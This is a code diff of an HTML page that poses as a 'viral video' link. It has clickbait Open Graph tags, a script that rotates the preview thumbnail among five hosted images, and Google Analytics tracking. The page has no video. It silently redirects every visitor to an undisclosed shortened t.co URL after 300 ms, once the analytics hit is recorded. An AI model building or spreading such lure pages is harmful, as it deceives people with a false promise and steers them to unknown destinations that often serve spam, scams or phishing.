@@ -6,21 +6,34 @@
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
-
         gtag('config', 'G-530836845');
     </script>
 
     <meta property="og:title" content="Watch Full Viral Video Here" />
     <meta property="og:description" content="Click to play the trending video" />
-    <meta property="og:image" content="https://your-image-url.com/thumbnail.jpg" />
     <meta property="og:type" content="video.other" />
+    
+    <!-- Yeh default image hai agar JavaScript load na ho -->
+    <meta id="og-image" property="og:image" content="https://i.ibb.co/HTKS5GyQ/image.jpg" />
 
     <script>
-        // Redirection Logic: Jo user analytics me record hone ke baad chalega
+        // YAHAN APNI 5 IMAGES KE LINKS PELE CORRESPONDING INVERTED COMMAS MEIN DIEN
+        var images = [
+            "https://i.ibb.co/HTKS5GyQ/image.jpg",
+            "https://i.ibb.co/DPM6pJxz/image.jpg",
+            "https://i.ibb.co/5gSt0BzX/image.jpg",
+            "https://i.ibb.co/KzV0GW4N/image.jpg",
+            "https://i.ibb.co/DDQv9R5Q/image.jpg"
+        ];
+
+        // Yeh code automatic har baar ek random image select karega
+        var randomImage = images[Math.floor(Math.random() * images.length)];
+        document.getElementById('og-image').setAttribute('content', randomImage);
+
+        // Redirection Logic
         window.onload = function() {
             var targetUrl = "https://t.co/ai7FHs76Ab";
             
-            // 300ms ka chota sa gap taake Analytics track kar le aur phir redirect ho
             setTimeout(function() {
                 window.location.href = targetUrl;
             }, 300);
